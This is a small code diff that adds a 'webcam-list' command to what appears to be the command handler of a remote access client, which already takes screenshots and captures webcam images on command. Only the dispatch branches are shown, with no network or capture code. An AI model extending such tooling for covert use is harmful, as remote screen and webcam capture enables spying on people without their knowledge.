@@ -94,6 +94,9 @@ void Client()
         else if (command == "screenshot") {
             CaptureScreenshot();
         }
+        else if (command == "webcam-list") {
+            GetConnectedWebcams();
+        }
         else if (command == "webcam") {
             CaptureWebcam();
         }
